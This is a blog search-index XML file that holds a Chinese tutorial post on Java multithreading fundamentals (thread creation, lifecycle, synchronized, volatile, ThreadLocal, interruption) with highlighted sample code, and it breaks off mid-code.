<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java多线程基础概念</title>
      <link href="/2021/02/24/thread-base/"/>
      <url>/2021/02/24/thread-base/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="CPU核心数和线程数的关系"><a href="#CPU核心数和线程数的关系" class="headerlink" title="CPU核心数和线程数的关系"></a><strong>CPU核心数和线程数的关系</strong></h3><p>正常情况下核心数：线程数=1：1；为了更好的利用CPU资源，在使用<a href="https://www.cnblogs.com/idorax/p/6884088.html" target="_blank" rel="noopener">超线程</a>技术后，核心数和线程数比值可为1：2，甚至更多。</p><h3 id="CPU时间片轮转机制"><a href="#CPU时间片轮转机制" class="headerlink" title="CPU时间片轮转机制"></a><strong>CPU时间片轮转机制</strong></h3><p>CPU时间片轮转机制，又称RR调度，会导致上下文切换。在编写多线程程序时候，要考虑上下文切换对性能的影响。上下文切换大概5000-20000个时钟周期。上下文切换可以理解为是不同线程或进程切换的时候对上个执行的清理以及下个执行内存的分配等。</p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a><strong><a href="https://zh.wikipedia.org/wiki/%E8%A1%8C%E7%A8%8B" target="_blank" rel="noopener">进程</a></strong></h3><p>进程是一次程序执行，系统资源分配和调度的最小单位，又称作业（job），任务（task）。进程内部有多个线程，会共享这个进程的资源。</p><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a><strong><a href="https://zh.wikipedia.org/wiki/%E7%BA%BF%E7%A8%8B" target="_blank" rel="noopener">线程</a></strong></h3><p>线程是CPU调度的最小单位，必须依赖进程存在。一个进程可能包含一个或多个线程，每个线程拥有独自的栈和寄存器。</p><h3 id="同步"><a href="#同步" class="headerlink" title="同步"></a><strong>同步</strong></h3><p>在单任务操作系统中，单任务执行是串行的，完全同步的。任务二要执行的前提是任务一执行完成<br><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.jpg" alt></p><h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a><strong>异步</strong></h3><p>在多任务操作系统中，多任务是并行（宏观上）的，异步的。任务1和任务二交替运行。系统运行效率大大提升。使用多线程也就是在使用异步<br><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/1B59971C-2972-44F8-8F4D-46C1D005627B.png" alt></p><h3 id="并发（Concurrent）"><a href="#并发（Concurrent）" class="headerlink" title="并发（Concurrent）"></a><strong>并发（Concurrent）</strong></h3><p>同一时间应对多件事情的能力，程序要设计成能处理多个同时发生的事件。（问题域）<br>在多任务操作系统中，可以最大限度的利用CPU的空闲时间来处理其他任务，CPU在这些任务之间不停地切换，由于切换的速度特别快，给使用者的感受就是这些任务似乎在同时运行。<br>eg:一条车道单位时间内能通过车辆的能力</p><h3 id="并行（Parallel）"><a href="#并行（Parallel）" class="headerlink" title="并行（Parallel）"></a><strong>并行（Parallel）</strong></h3><p>同一时间动手做多件事情的能力，将问题中的多个部分并行执行，来加速解决问题。（方法域）<br>eg:同一时间能通过多辆车的能力</p><h3 id="高并发编程的意义和注意事项"><a href="#高并发编程的意义和注意事项" class="headerlink" title="高并发编程的意义和注意事项"></a><strong>高并发编程的意义和注意事项</strong></h3><h4 id="意义"><a href="#意义" class="headerlink" title="意义"></a><strong><em>意义</em></strong></h4><p>充分利用CPU资源，加快用户响应的时间，程序模块化，异步化；</p><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a><strong><em>问题</em></strong></h4><ol><li>线程共享进程资源，存在冲突</li><li>容易导致死锁</li><li>启用太多的线程，有搞垮机器的可能。<h2 id="初识多线程"><a href="#初识多线程" class="headerlink" title="初识多线程"></a>初识多线程</h2>先来看一段代码：<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Thread000</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span> <span class="token annotation punctuation">@Override</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"自定义线程"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>class Main {<br>    public static void main(String[] args) {<br>        Thread t = new Thread000();<br>        t.start();<br>        System.out.println(“主线程”);<br>    }<br>}</p><pre><code>**运行结果**</code></pre><p>主线程<br>自定义线程</p><pre><code>分析以上程序的运行结果，得出以下结论：**结论：**多线程调用的随机性代码运行结果并不由代码执行顺序决定。**注意：**1. 多线程多次调用会抛出异常`IllegalThreadStateException`。Thread中有一个threadStatus状态，初始为0，代表一个新线程，当调用过后，再次调用值不再为零，抛出异常。2. 执行start方法的顺序并不代表启动线程的顺序。调用start方法只是使线程处于可运行状态。## 线程的创建**三种创建方式**1. 继承Thread2. 实现Runnable，没返回值3. 利用Callable和Future(在java.utils.concurrent 包)，有返回值4. 利用线程池创建``` java/** * 创建线程的方式 * @author lwy * @date 2019/6/27 */public class CreatedThread {    /**     * 继承Thread创建线程     */    private static class Thread001 extends Thread {        @Override        public void run() {            System.out.println(&quot;extend thread created thread&quot;);        }    }    /**     * Runnable创建线程，无返回值     */    private static class Thread002 implements Runnable {        @Override        public void run() {            System.out.println(&quot;implement runnable created thread&quot;);        }    }    /**     * Callable创建线程，有返回值。     */    private static class Thread003 implements Callable&lt;String&gt; {        @Override        public String call() throws Exception {            System.out.println(&quot;callable created thread&quot;);            return &quot;call result&quot;;        }    }    public static void main(String[] args) throws ExecutionException, InterruptedException {        Thread001 thread001 = new Thread001();        thread001.start();        Thread002 thread002 = new Thread002();        new Thread(thread002).start();        Thread003 thread003 = new Thread003();        FutureTask&lt;String&gt; futureTask = new FutureTask&lt;String&gt;(thread003);        new Thread(futureTask).start();        System.out.println(futureTask.get());    }}</code></pre><h2 id="线程生命周期"><a href="#线程生命周期" class="headerlink" title="线程生命周期"></a>线程生命周期</h2><p><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="89e7c6e2849c3ebb694a29c61b66cf74"></p><p>New:新创建的线程，没有执行<br>Runnable:运行中的线程，正在执行run()方法的Java代码<br>Block:运行中的线程因为某些操作被阻塞而挂起<br>Timed Waiting:运行中的线程因为执行sleep()方法正在计时等待<br>Terminated：线程已终止，run（）方法执行完毕</p><h2 id="线程安全性"><a href="#线程安全性" class="headerlink" title="线程安全性"></a>线程安全性</h2><h3 id="实例变量不共享"><a href="#实例变量不共享" class="headerlink" title="实例变量不共享"></a>实例变量不共享</h3><ol><li><p>当实例变量不共享时候，多线程各自处理各自的变量，这个时候没有线程安全问题<br>eg：耐克工厂开了几家分店，每家分店各提供100双鞋子，各家分店经营各家的，库存互不影响。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/*** 实例变量不共享** @author lwy* @date 2018/12/14*/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Thread002</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span> <span class="token keyword">private</span> String name<span class="token punctuation">;</span> <span class="token keyword">private</span> Integer sum <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token function">Thread002</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token annotation punctuation">@Override</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">while</span> <span class="token punctuation">(</span>sum <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"----------->"</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span><span class="token punctuation">;</span>         sum<span class="token operator">--</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Thread002</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Thread002</span><span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/50E3D9A3-2582-46F8-A628-2D5D678A3889.png" alt="786620422826705d407bca2d29cb5b16"></p></li></ol><h3 id="实例变量共享"><a href="#实例变量共享" class="headerlink" title="实例变量共享"></a>实例变量共享</h3><ol><li><p>当多个线程共享一个是实例变量的时候，多个线程共同操作一个变量，这个时候会出现线程安全问题。<br>eg：耐克工厂开了1家分店，这家分店共提供100双鞋子，多个用户去购买，多个用户共享这个店的库存。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/*** 实例变量共享：非线程安全* 通过加锁 synchronized** @author lwy* @date 2018/12/14*/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Thread003</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span> <span class="token keyword">private</span> String name<span class="token punctuation">;</span> <span class="token keyword">private</span> Integer sum <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token function">Thread003</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token annotation punctuation">@Override</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     sum<span class="token operator">--</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//1：取得sum值</span>     <span class="token comment" spellcheck="true">//2：sum-1</span>     <span class="token comment" spellcheck="true">//3：对sum进行赋值</span>     System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"--------->"</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>     Thread003 t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread003</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token string">"B"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token string">"C"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token string">"D"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token string">"E"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token string">"F"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token string">"G"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token string">"H"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token string">"I"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token string">"J"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/CB351D43-8FED-447E-89BE-E0001330FE20.png" alt="f4e6b802f1f256f0487eb27614d1b67f"></p></li></ol><h2 id="线程间的共享"><a href="#线程间的共享" class="headerlink" title="线程间的共享"></a>线程间的共享</h2><p>当多个线程线程实例变量共享时，会遇到安全性问题。而解决这个安全性问题就要保证操作的原子性，需要通过加锁来实现。</p><h3 id="synchronized内置锁"><a href="#synchronized内置锁" class="headerlink" title="synchronized内置锁"></a>synchronized内置锁</h3><h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><p>   使用synchronized可以对线程加锁。进而使线程安全。既保证共享变量原子性，有保证共享变量可见性，因为多个线程在同一时刻，只能有一个线程处于方法和同步块中，保证线程对变量的可见性和排他性</p><h4 id="锁的是什么？"><a href="#锁的是什么？" class="headerlink" title="锁的是什么？"></a>锁的是什么？</h4><p>   将任意对象作为监视器monitor<br>   锁的是对象，而不是代码，任何对象都可以做锁使用，但是不要使用常量和基本类型包装类，这样会造成未知的问题。<br>   对象锁，锁的是类的对象实例。<br>   类锁 ，静态方法加锁。锁的是每个类的的Class对象，每个类的的Class对象在一个虚拟机中只有一个，所以类锁也只有一个。</p><h4 id="底层实现"><a href="#底层实现" class="headerlink" title="底层实现"></a>底层实现</h4><p>   JVM规范没有要求具体的实现，hotspot中是通过对象头markword上两位来实现的。</p><h4 id="可重入锁"><a href="#可重入锁" class="headerlink" title="可重入锁"></a>可重入锁</h4><p>可以防止死锁</p><h4 id="异常和锁"><a href="#异常和锁" class="headerlink" title="异常和锁"></a>异常和锁</h4><p>程序出现异常，锁会释放，容易造成数据不一致问题。</p><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>   单例模式-双重校验锁</p><h4 id="锁升级的概念"><a href="#锁升级的概念" class="headerlink" title="锁升级的概念"></a>锁升级的概念</h4><p>  JDK早期，synchronized实现是重量级锁，直接向操作系统进行申请。后续进行改进。引入了锁升级的概念<br>  偏向锁—自旋锁—重量级锁</p><h5 id="偏向锁"><a href="#偏向锁" class="headerlink" title="偏向锁"></a>偏向锁</h5><p>   在markword上记录这个线程ID，如果线程争用，升级为偏向锁</p><h5 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h5><p>   发生线程争用，现在外面等着转圈圈。要是等待十圈以后，会升级为重量级锁</p><h5 id="重量级锁"><a href="#重量级锁" class="headerlink" title="重量级锁"></a>重量级锁</h5><p>   重量级锁要直接向操作系统进行申请，因此效率比较低。</p><h5 id="自旋锁和重量级锁的比较"><a href="#自旋锁和重量级锁的比较" class="headerlink" title="自旋锁和重量级锁的比较"></a>自旋锁和重量级锁的比较</h5><table><thead><tr><th>自旋锁</th><th>重量级锁</th></tr></thead><tbody><tr><td>用户态</td><td>内核态</td></tr><tr><td>占用CPU，内存资源</td><td></td></tr><tr><td>适合执行时间短，线程数少</td><td></td></tr><tr><td>atomicXXX</td><td></td></tr></tbody></table><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>   jps查看任务进程号<br>   jstack查看堆栈信息。<br>   jconsole查看java监视和管理控制台。</p><h4 id="解决死锁"><a href="#解决死锁" class="headerlink" title="解决死锁"></a>解决死锁</h4><p>   locks接口，使用相同的加锁顺序。</p><h3 id="volatile关键字"><a href="#volatile关键字" class="headerlink" title="volatile关键字"></a>volatile关键字</h3><p>虚拟机提供的轻量的同步机制，效率最高</p><p>要深入了解volatile，要理解java内存模型。</p><p>当变量被volatile修饰，每次使用的时候，都去主内存读取，每次设值的时候，都将该变量值刷回主内存。</p><p>不是安全的<br>当设值的时候不是原子操作的时候，会出现同步问题。</p><p>适用于只有一个线程写，多个线程读的场景，因为它只能确保可见性。不能确保原子性</p><h3 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h3><p>map&lt;Thread,T&gt;<br>用空间换取线程的安全性。<br>确保线程使用自己的那份拷贝</p><p>占用内存。</p><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><h3 id="返回当前线程"><a href="#返回当前线程" class="headerlink" title="返回当前线程"></a>返回当前线程</h3><p>   Thread.currentThread()</p><h3 id="返回线程名称"><a href="#返回线程名称" class="headerlink" title="返回线程名称"></a>返回线程名称</h3><pre><code>getName()</code></pre><h3 id="当前线程是否处于活动状态"><a href="#当前线程是否处于活动状态" class="headerlink" title="当前线程是否处于活动状态"></a>当前线程是否处于活动状态</h3><pre><code>isAlive()</code></pre><h3 id="线程休眠"><a href="#线程休眠" class="headerlink" title="线程休眠"></a>线程休眠</h3><pre><code>Thread.sleep()：在指定的毫秒数内让当前‘正在执行的’线程休眠.该线程为Thread.currentThread()</code></pre><h3 id="取得线程的唯一标识"><a href="#取得线程的唯一标识" class="headerlink" title="取得线程的唯一标识"></a>取得线程的唯一标识</h3><pre><code>getId()</code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * currentThread()：获取当前线程 * sleep():在指定的毫秒数内让当前"正在执行的线程休眠"（暂停执行），这个正在执行的线程是指currentThread()返回的线程。 * getId():取得线程的唯一标识 * yield():放弃当前CPU资源，将它让给其他的任务去占用cpu执行时间，但放弃时间不确定。将线程从运行转到可运行状态，但是下个时间片，该线程依然有可能被再次选中运行。 * setPriority()：设置线程的优先级。 * * @author lwy * @date 2018/12/17 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadMethod</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Thread t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">" i = "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"AA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"the begin of alive thread ----> "</span> <span class="token operator">+</span> t<span class="token punctuation">.</span><span class="token function">isAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"threadName ---> "</span> <span class="token operator">+</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"  and  "</span> <span class="token operator">+</span> t<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"the count of active threads ------> "</span> <span class="token operator">+</span> Thread<span class="token punctuation">.</span><span class="token function">activeCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"the current of thread ----> "</span> <span class="token operator">+</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"the id of current thread ----> "</span> <span class="token operator">+</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"the middle of alive thread ----> "</span> <span class="token operator">+</span> t<span class="token punctuation">.</span><span class="token function">isAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"the id of current thread ----> "</span> <span class="token operator">+</span> t<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"the end of alive thread ----> "</span> <span class="token operator">+</span> t<span class="token punctuation">.</span><span class="token function">isAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="停止-中断线程"><a href="#停止-中断线程" class="headerlink" title="停止/中断线程"></a>停止/中断线程</h3><p>   <strong>stop()</strong>:<br>   强制停止线程，该方法是过时的，不安全的。<br>   <strong>interrupt()：中断一个线程</strong>:<br>   调用一个线程的interrupt()方法中断一个线程，并不是强硬关闭线程，只是跟这个线程打了一个招呼，将线程的中断标志位置设为true，线程是否中断，由线程本身决定。<br>   eg:在执行一个长时间任务的时候，有时候需要中断，从网络下载大文件，不想下载，下载中点击取消，这时，程序就要中断下载线程的执行。</p><p>   <strong>判断线程是否处于停止状态</strong><br>  <strong>Thread.interrupted()</strong>:<br>  static方法interrupted() 判定当前线程是否处于中断状态，同时中断标志位改为false（测试当前线程是否已经中断，线程的中断状态由该方法清除。意思就是，连续两次调用，第二次肯定是false。该方法有清除状态的功能）。<br>  <strong>isInterruped()</strong>:测试线程thread对象是否已经是中断状态，但不清楚状态标志。</p><p>  方法里如果抛出InterruptedException，线程的中断标志位会被复位成false，如果确实是需要中断线程，要求我们自己在catch语句块里再次调用interrupt()</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 线程的停止:在线程处理完任务之前停掉正在做的操作，也就是放弃当前的操作 * &lt;p> * Thread.stop()（已过时）,虽然这个方法能达到预期效果，但是这个方法是不安全的，最好不要使用 * interrupt() :这个方法不会终止一个正在运行中的线程，还需要加入一个判断 * &lt;p> * 线程终止： * 1：使用退出标志，使线程正常退出。run方法运行完线程自动终止。 * 2：使用stop方法强行终止线程。（方法已过时）,虽然这个方法能达到预期效果，但是这个方法是不安全的，最好不要使用 * 3：使用interrupt中断线程。 * &lt;p> * 判断线程是否终止 * interrupted():静态方法。测试当前线程是否已经中断，线程的中断状态由该方法清除。意思就是，连续两次调用，第二次肯定是false。该方法有清除状态的功能 * isInterrupted():测试线程thread对象是否已经是中断，但不清楚状态标志。 * * @author lwy * @date 2018/12/17 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadStop</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Thread t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span 